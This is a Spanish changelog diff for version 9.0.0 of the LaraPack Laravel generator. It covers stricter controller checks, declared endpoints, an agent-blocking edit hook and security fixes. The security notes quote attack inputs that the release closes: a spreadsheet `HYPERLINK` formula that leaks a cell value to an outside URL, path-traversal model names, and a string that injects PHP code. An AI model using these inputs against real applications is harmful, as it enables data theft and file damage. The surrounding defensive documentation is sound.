@@ -1,5 +1,305 @@
 # Changelog
 
+## 9.0.0
+
+Los agentes respetaban `return $request->handle();` en los controladores que
+genera LaraPack y lo perdían en cuanto tenían que escribir uno que el generador
+no sabía hacer: un escritorio, un asistente, el canje de un token, un webhook.
+`verify` no lo veía nunca, porque sólo miraba el manifiesto. En un sistema real
+de 65 paquetes salieron cuatro controladores con validación, autorización y
+consultas dentro, y diecinueve traits de autorización en `Http/Controllers`.
+
+Esta versión ataca la deriva por tres lados: **lo que no es CRUD se declara y se
+genera**, **`verify` revisa todos los controladores** y **la regla se ejecuta
+como hook** en cada edición del agente. Además trae una auditoría de seguridad
+de lo generado.
+
+Es mayor por tres cambios que rompen: `verify` falla donde antes pasaba, el
+Resource generado filtra `appends[]` y los comandos validan el nombre del
+modelo. Los pasos para un proyecto existente están al final y en «De 8.0 a 9.0»
+de la guía de actualización del README.
+
+### CAMBIO QUE ROMPE: `verify` revisa la forma de todos los controladores
+
+Recorre cada clase de cualquier `Http/Controllers` de la raíz y de los paquetes
+locales (repositorios `path` del `composer.json` y `packages/*`), los haya
+generado LaraPack o no, y aunque no haya manifiesto. Lee los archivos con el
+tokenizador: nunca carga ni ejecuta código del proyecto.
+
+| Comprobación | Nivel | Qué detecta |
+| --- | --- | --- |
+| `controller-shape` | error | Una acción que hace algo más que `return $request->handle();`: recibe `Illuminate\Http\Request` o `FormRequest` base, valida con `validate()`, pasa una expresión a `handle()`. También un `__call`, un constructor que hace algo más que asignar lo inyectado y registrar middleware, y un `middleware()` estático con un closure. |
+| `request-handle` | error | La request que recibe la acción no define `handle()`, ni en sí ni en un trait o un padre. Una de `vendor/` sólo se informa. |
+| `controller-concern` | error / aviso | Un trait con lógica en `Http/Controllers`. Error si lo usa un controlador; aviso si sólo lo usan requests: su sitio es `Http/Requests/Concerns`. |
+| `hand-rolled` | aviso | Una acción marcada `#[HandRolled('razón')]`. Sin razón literal es error y no excusa nada. |
+| `route-closure` | aviso | Un closure con cuerpo como acción de una ruta en `routes/`. No cuentan los de `group()` ni el `return view('...')` con el que nace `routes/web.php`. |
+
+**`controller-shape` es el único dueño de «el controlador hace algo más que
+`return $request->handle();`»**, en los generados y en los escritos a mano. No
+hay una comprobación aparte para los generados: el mismo problema saldría dos
+veces y con dos reglas.
+
+**`#[HandRolled]` no es una salida.** La excepción legítima —un webhook que
+comprueba la firma sobre el cuerpo en bruto, un canje OAuth que responde con los
+errores de OAuth— se declara en la clase o en la acción:
+
+```php
+use Innoboxrr\LarapackGenerator\Attributes\HandRolled;
+
+#[HandRolled('La firma se calcula sobre el cuerpo en bruto.')]
+class StripeWebhookController { ... }
+```
+
+`verify` la lista como **aviso** en cada ejecución, y con `--strict` falla. La
+aprueba el dueño del proyecto, no quien escribe el controlador: los mensajes de
+`controller-shape` ya no la ofrecen como arreglo, y un agente no debe añadirla
+para que `verify` pase. La razón sale sin caracteres de control.
+
+**`--check=<nombre>`**, repetible, corre sólo esas comprobaciones.
+`--format=json` sigue siendo un único documento, y un nombre desconocido falla.
+
+### CAMBIO QUE ROMPE: el Resource sólo añade los `appends` que declara
+
+El Resource generado hacía `setAppends($request->get('appends'))` sin filtrar:
+el cliente decidía qué accessor se ejecutaba, en cada fila del listado —una URL
+firmada, un dato descifrado, una consulta cara—, y un nombre que no existía
+daba un 500. Ahora tiene `protected array $appendable = []`: sólo se añade lo
+que esté en esa lista, **sumado** a los `$appends` que ya declara el modelo, que
+`setAppends()` habría reemplazado.
+
+**Rompe** a quien pedía appends desde el cliente: decláralos en `$appendable`.
+Ni la interfaz generada ni las aplicaciones conocidas los piden.
+
+### CAMBIO QUE ROMPE: el nombre del modelo se valida
+
+`larapack:remove-full-model ..` (o `.`, o vacío) borraba recursivamente las
+carpetas de requests, filtros, eventos y notificaciones de **todos** los
+modelos, y `larapack:model ../../X` escribía fuera de la raíz. Los comandos
+rechazan ahora un nombre que no sea un identificador (`^[A-Za-z][A-Za-z0-9_]*`,
+sin salto de línea al final), también con `--format=json`. `Post` y `blog_post`
+siguen valiendo; un nombre con `-`, espacios o rutas, que ya generaba basura,
+falla. Borrar ya no sigue enlaces simbólicos, tampoco si la carpeta del modelo
+es uno.
+
+### Seguridad
+
+- **El IndexRequest generado fuerza `managed`.** `ManagedFilter::canView()`
+  sólo acotaba si el cliente mandaba `managed`: quien lo omitía listaba todas
+  las filas. `prepareForValidation()` lo fija, mande lo que mande la petición.
+  `canView()` acota a todos, administrador incluido —el `before()` de la
+  política no lo salta—, así que tiene que cubrir el caso administrador él
+  mismo.
+- **La exportación no convierte en fórmula lo que escribió un usuario.** Un
+  título `=HYPERLINK("https://…?d="&B2,"Ver")` llegaba al xlsx del
+  administrador como fórmula. La clase Export hereda el binder de Laravel Excel
+  y guarda como texto lo que empieza por `=`.
+- **Los valores libres del laraimport se escapan** al pegarlos en PHP y JS:
+  `default`, `cast` y `constraint` en las migraciones y el modelo, etiquetas y
+  valores de `enum` en las vistas. `"default": "it's"` ya no deja una migración
+  que no compila, y un valor con `'); …` ya no mete código. Lo que ya era
+  correcto sale idéntico. El esquema exige que `load_relations[].namespace` sea
+  un namespace PHP.
+- **Proyectos generados antes.** Las plantillas sólo arreglan lo que se genera
+  desde ahora. Dos comprobaciones nuevas, como **aviso** (con `--strict`
+  fallan), encuentran lo viejo y lo que un agente copie de ello:
+  `index-managed`, una request que usa el `Builder` de SearchSurge sin forzar
+  `managed` (`mergeIfMissing` no cuenta), y `resource-appends`, un
+  `setAppends()` alimentado por la petición sin pasar por una lista blanca.
+  Como `controller-shape`, no dependen del manifiesto.
+- **`larapack:fix index-managed resource-appends`** las arregla de forma
+  determinista, con el mismo cambio en cada archivo y sacado de la plantilla:
+  `$this->merge(['managed' => true])` al principio de `prepareForValidation()`
+  (lo crea si falta, llamando al heredado si lo hay) y el bloque de
+  `$appendable` en el Resource, con la propiedad si falta. Trabaja sobre
+  tokens; lo que no reconoce con certeza lo deja y lo lista como `skipped` con
+  la razón (y sale con código distinto de cero). Nada cuenta como arreglado
+  hasta que parsea y `verify` ya no lo marca, así que es idempotente.
+  `--dry-run` enseña el diff unificado, `--format=json` da `fixed`, `skipped` y
+  `unchanged` por comprobación y `--path` acota a un subdirectorio. Pasa el Pint
+  del proyecto si lo tiene. En una copia de school-management arregló los 524
+  IndexRequests y los 691 Resources sin saltarse ninguno.
+- **`larapack:fix --package=<x>`** (repetible) acota a un paquete local por el
+  nombre de su directorio en `packages/` o su nombre de Composer, o a `app`, el
+  núcleo (lo que no cuelga de ningún paquete). Se combina con `--path`; un
+  nombre que no existe falla con la lista de los que hay.
+- **`larapack:fix` sólo toca lo que viene del generador**: reescribe
+  `prepareForValidation()` y el bloque `setAppends()` cuando tienen la forma
+  generada; si no, `skipped`. Una prueba fija que un IndexRequest con lógica
+  propia alrededor no pierde nada.
+- **`index-managed` reporta `admin_path_missing`**, sin arreglar nada: los
+  `ManagedFilter` de los IndexRequest arreglados o ya correctos cuyo
+  `canView()` no tiene camino para el alcance sin restricción. Con `managed`
+  forzado, al administrador le saldría el listado vacío. Cuenta como camino un
+  `return $query;` en cualquier rama (también el cuerpo de la plantilla) o un
+  nombre de `ManagedFilterAudit::UNRESTRICTED_MARKERS` (`unrestricted`,
+  `isUnrestricted`, `viewAny`, `isAdmin`), también en los soportes del proyecto
+  que `canView()` llama estáticamente, hasta tres saltos. El filtro se localiza
+  como SearchSurge: `filtersNamespace` literal de las opciones del Builder,
+  `<espacio del modelo>\Filters\<Modelo>\ManagedFilter` o
+  `App\Models\Filters\...`; lo que no se encuentra sale en
+  `managed_filter_unresolved`. Es una heurística de lectura, no una prueba: se
+  revisa a mano y no cambia el código de salida. En school-management, los 682
+  filtros de sus IndexRequests tienen camino (los 626 que delegan en
+  `AccessScope`/`PolicyScope`, por `$reach->unrestricted` e `isAdmin()`).
+- **`resource-appends` reporta `appendable_proposals`**: por Resource, los
+  accessors que el front pide con `appends` (`appends[]=x`, `appends=x,y`,
+  `appends: [...]`, `params.appends = [...]`, `appends.push(...)`) en
+  `resources/` y en `resources/{react,js,vue}` de cada paquete, asociados por el
+  modelo o la ruta que el archivo menciona cerca, y con `exists` según el
+  modelo y sus traits declaren el accessor. Lo que no se asocia sale «sin
+  asociar» con su archivo:línea. Son propuestas sin confirmar: `$appendable`
+  sigue vacío, porque una lista mal hecha deja de mostrar un dato en pantalla.
+
+### Endpoints y controladores declarados (SPEC 02)
+
+Para un endpoint que no era una de las doce acciones no había nada que declarar,
+así que se escribía a mano y sin plantilla. Ahora:
+
+- **`endpoints`, en un modelo**: `name`, `method`, `uri`, `target`
+  (`record` o `collection`), `ability`, `public` y `middleware`.
+- **`controllers`, en la raíz**, para lo que no tiene modelo: un escritorio, un
+  asistente, un webhook. Su `ability` es una habilidad de Gate; sin ella,
+  `authorize()` nace en `false`.
+
+Cada endpoint genera el método del controlador —sólo
+`return $request->handle();`—, la ruta con nombre (`importRoster` →
+`import.roster`, `importCSV` → `import.csv`), `<Name>Request` que pregunta a la
+política y delega en `<name>Model($request)` del trait `Operations`, la
+habilidad en la política naciendo en `false` y un test. Un endpoint `public`
+sale de `auth:sanctum` sólo para ese método y autoriza con
+`$this->user('sanctum')`, que ve el token Bearer; un invitado no pasa por
+`before()`, un administrador con sesión sí. Sin las dos claves se genera
+exactamente lo mismo que antes.
+
+`validate` rechaza un nombre CRUD o reservado, una `uri` repetida o que tapa a
+otra, un controlador que se llama como un modelo —también uno ya generado por
+otro laraimport— y una habilidad CRUD que el modelo no tiene; avisa de un
+endpoint público sin `throttle:`. En `verify`, **`endpoint-missing`** (error)
+dice qué pieza le falta a un endpoint declarado y qué escribir, y
+**`route-not-declared`** ve además métodos, rutas y requests que nadie declaró,
+y distingue lo escrito a mano de lo que se retiró del laraimport.
+`larapack:full-model` suelto conserva los endpoints que guarda el manifiesto.
+
+**Con `--vue` o `--react`, también su interfaz.** Cada endpoint tiene su función
+en el contrato JS del modelo (`publishModel(data, { confirm })`, que llama a la
+ruta por nombre con el verbo declarado; `data.id` es el registro). Los que no son
+`get` salen como acción y preguntan antes, como borrar: los de `collection` en la
+barra de la tabla (`crudActions()`), los de `record` en el menú de cada fila (el
+Resource los añade a `actions`) y en el de la ficha (`recordActions()`, que lee
+`ModelCard`). Las habilita la política por `policies`, que ahora responde con la
+habilidad que pregunta cada endpoint (`archive` → `update`). Un `controllers[]`
+sólo recibe su contrato, `src/controllers/<nombre>/index.js` con
+`<name>Endpoint()`, sin pantalla. Un endpoint con parámetros en la URI además del
+registro no sale en la interfaz —`import` lo avisa—, y ninguno trae formulario:
+el esquema no declara campos de endpoint. `verify` añade a `endpoint-missing` la
+función que falta en un contrato y a `route-prefix` el prefijo del contrato de
+un controlador. Sin endpoints, la interfaz sale igual que antes.
+
+Las reglas declaradas quedan pendientes: `rules()` es un hueco. El detalle está
+en `docs/specs/SPEC-02-acciones-declaradas.md`.
+
+### La guía como hook: `larapack:guard`
+
+Una regla escrita se olvida a mitad de una sesión larga; un hook que devuelve el
+error en cada edición, no.
+
+- **`larapack:guard`** lee el JSON del hook de Claude Code. Si el archivo
+  editado es un controlador, una request, una ruta, una política, una migración
+  o algo generado que no es un hueco, le pasa las comprobaciones de `verify` y,
+  si hay **errores en ese archivo**, sale con 2: Claude Code bloquea y le
+  devuelve al modelo el motivo y la regla. A un controlador escrito a mano le
+  recuerda que DEBE seguir el patrón. Lo de `vendor/` y `node_modules/` se
+  ignora.
+- **`larapack:guard --stop`**, al terminar el turno, verifica el proyecto y
+  retiene sólo por los errores de lo que tocó la sesión (lo que pasó por el hook
+  de edición y lo que git ve sin confirmar); lo demás lo dice sin bloquear, para
+  que una consola no quede retenida por lo que otra dejó a medias. Respeta
+  `stop_hook_active`.
+- **`larapack:skill --hooks`** fusiona en `.claude/settings.json` los hooks
+  PostToolUse (`Write|Edit|MultiEdit`) y Stop, sin duplicar ni tocar los demás.
+  Mientras no exista `vendor/`, el hook no hace nada en vez de fallar.
+- **`larapack:skill` escribe un bloque en `AGENTS.md`**, entre
+  `<!-- LARAPACK:BEGIN -->` y `<!-- LARAPACK:END -->`, para Codex y otros
+  agentes. Lo de fuera de los marcadores no se toca y `--no-agents` lo omite.
+  Con `--path=AGENTS.md` no se añade: el skill entero ya es ese archivo.
+- **`larapack:new`** crea el paquete con el bloque y los hooks puestos.
+- **La skill** explica cuándo declarar un endpoint, el patrón de los que se
+  escriben a mano, la guardia y la lista «Antes de terminar una tarea».
+
+### Dependencias
+
+- **Pisos de los paquetes `innoboxrr-*` del módulo generado**, en
+  `ecosystem.json` y en los `package.json`, a las versiones que migraron a
+  Vite 8 y Vitest 5: `innoboxrr-form-core ^2.9.0`, `innoboxrr-form-elements
+  ^6.9.0`, `innoboxrr-react-form-elements ^3.9.0`, `innoboxrr-vue-datatable
+  ^3.2.0`, `innoboxrr-react-datatable ^3.2.0`, `innoboxrr-http-request ^2.1.0`,
+  `innoboxrr-i18n ^1.3.0`, `innoboxrr-locale-generator ^2.1.0`,
+  `innoboxrr-js-validator ^2.1.0` e `innoboxrr-route-resolver ^2.1.0`.
+- **El módulo Vue acepta `vue-router ^4.5.0 || ^5.0.0` y `pinia ^3.0.0 ||
+  ^4.0.0`.** La 5 instala desde `innoboxrr-vue-datatable` 3.2.0, que amplió su
+  peer; con la 3.1.1 npm fallaba con ERESOLVE.
+- **`php.matrix` documenta 8.3, 8.4 y 8.5**, como la CI.
+- **El Resource lee `appends` con `input()`**, no con `Request::get()`, que
+  Laravel 13 marca obsoleto. `StubsAvoidDeprecatedApisTest` impide que una
+  plantilla vuelva a usarlo.
+- **CAMBIO QUE ROMPE (para los paquetes npm del ecosistema): la línea base JS
+  pasa a Vite 8 y Vitest 5, y `node.engines` a `>=22.12`.** Vitest 5 exige Node
+  `^22.12 || >=24`, y Node 20 es EOL desde 2026-04-30. Los diez paquetes
+  `innoboxrr-*` ya migraron (versiones de arriba) y su CI prueba Node 22 y 24
+  con `node-versions: '["22", "24"]'`. Un paquete npm propio que siga en
+  `vitest ^3` o `engines >=20` sale ahora en `larapack:audit`: sube sus
+  `devDependencies`, su `engines` y el `node-versions` de su `tests.yml`.
+- **`ecosystem.json` pide `innoboxrr/larapack-generator ^9.0`.**
+
+### Otros cambios
+
+- **`verify` lee el manifiesto una sola vez.** En un proyecto de 128 modelos
+  pasó de más de dos minutos a menos de un segundo; sin eso ningún hook era
+  viable.
+- **La lectura sin cargar aguanta** un archivo a medio escribir —el que un
+  agente deja entre dos ediciones— y los ganchos de propiedad de PHP 8.4.
+- **Una sola definición de qué código se recorre.** `controller-shape` y las
+  comprobaciones de seguridad buscaban la raíz, los repositorios `path`,
+  `packages/*` y sus PSR-4 con dos copias del mismo código; ahora las dos usan
+  `ProjectSources`, y un paquete que vea una lo ve la otra. Livewire, Filament
+  y los controladores fuera de `Http/Controllers` siguen fuera a propósito: no
+  reciben un FormRequest ni delegan en su `handle()`.
+
+### QUÉ HACER AL ACTUALIZAR
+
+Lo generado sólo cambia en el IndexRequest, el Resource y la exportación. Lo que
+cambia es lo que `verify` deja pasar. En una aplicación como school-management:
+
+1. **Actualiza y corre `verify` antes de tocar nada:**
+   `composer require innoboxrr/larapack-generator:"^9.0" --dev`,
+   `php artisan larapack:skill --force` (sin `--hooks` todavía) y
+   `php artisan larapack:verify --format=json`.
+2. **Va a fallar en los controladores escritos a mano.** En school-management,
+   `controller-shape` en `InstalledModulesController`, `TokenController`
+   (OneRoster), `RegistrationController` (LTI) e `InboundWebhookController`, y
+   `controller-concern` en los traits de `Http/Controllers/Concerns`
+   (`AuthorizesInScope` y compañía).
+3. **Arréglalos moviendo la lógica, no marcándolos.** O se declaran como
+   `endpoints` de su modelo o en `controllers[]` y se generan, o el controlador
+   escrito a mano recibe un `FormRequest` propio cuyo `authorize()`, `rules()` y
+   `handle()` hacen el trabajo; los errores de protocolo, con
+   `failedValidation()` y `failedAuthorization()`. Los traits pasan a
+   `Http/Requests/Concerns`. `#[HandRolled('razón')]` sólo si el dueño del
+   proyecto lo aprueba.
+4. **Regenera lo que no editaste** con `larapack:import --force` para recibir el
+   IndexRequest, el Resource y la exportación nuevos. En los editados,
+   `index-managed` y `resource-appends` dicen cuáles faltan, y
+   `larapack:fix index-managed resource-appends` los arregla; lo que salte, a
+   mano: fuerza `managed` en `prepareForValidation()` y filtra `appends` con
+   `$appendable`.
+5. **Activa la guardia cuando `verify` esté limpio**, con
+   `php artisan larapack:skill --hooks`. Antes, cada edición de uno de esos
+   archivos y cada fin de turno que los toque retendrían al agente por errores
+   que no causó.
+
+El paso a paso, con ejemplos, está en «De 8.0 a 9.0» de la guía de
+actualización del README.
+
 ## 8.0.0
 
 Dos cambios en las tablas que genera: un paquete puede declarar el prefijo de
